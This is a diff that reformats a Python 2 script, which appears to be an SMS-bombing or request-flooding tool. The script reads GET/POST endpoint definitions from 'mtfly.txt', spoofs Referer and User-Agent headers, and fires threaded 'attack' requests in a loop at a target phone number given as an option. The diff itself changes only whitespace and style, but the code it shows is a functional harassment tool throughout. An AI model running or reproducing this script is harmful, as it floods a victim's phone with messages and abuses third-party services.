@@ -1,41 +1,44 @@
 #!/usr/bin/env python
-#coding:utf-8
+# coding:utf-8
 __author__ = 'mtfly'
 
 import requests
 import sys
 import time
 import threading
-from re import split,sub
+from re import split, sub
 from optparse import OptionParser
+
 
 def attack_post(mtfly):
     url = mtfly[1]
-    mtfly[2] = split('&',mtfly[2])
+    mtfly[2] = split('&', mtfly[2])
     dics = {}
     for i in range(len(mtfly[2])):
         mtfly[2][i] = split('=', mtfly[2][i])
         dics.setdefault(mtfly[2][i][0], mtfly[2][i][1])
     payload = dics
     headers = {'Referer': mtfly[3],
-    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
+               'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
     try:
         requests.post(url, data=payload, headers=headers)
         print 'post success!'
-    except Exception,e:
+    except Exception, e:
         print e
         print 'post fail!'
+
 
 def attack_get(mtfly):
     url = mtfly[1]
     headers = {'Referer': mtfly[3],
-    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
+               'User-Agent': 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac;'}
     try:
-        requests.get(url,headers=headers)
+        requests.get(url, headers=headers)
         print 'get success!'
-    except Exception,e:
+    except Exception, e:
         print e
         print 'get fail!'
+
 
 def attack(mi):
     mtfly = split('::|\n', mi)
@@ -43,6 +46,7 @@ def attack(mi):
         attack_get(mtfly)
     elif mtfly[0] == 'post':
         attack_post(mtfly)
+
 
 def t_attack(m):
     threads = []
@@ -55,6 +59,7 @@ def t_attack(m):
     for i in nloops:
         threads[i].join()
 
+
 p = OptionParser()
 p.add_option('-n', '--number', default=13999999999, help='The phone\'number')
 p.add_option('-l', '--loop', default=10, help='The number of loop')
@@ -64,8 +69,8 @@ loop = int(options.loop)
 m = list()
 
 try:
-    f = open('mtfly.txt','r')
-except Exception,e:
+    f = open('mtfly.txt', 'r')
+except Exception, e:
     print e
     print 'flie fail!'
 for eachLine in f.readlines():
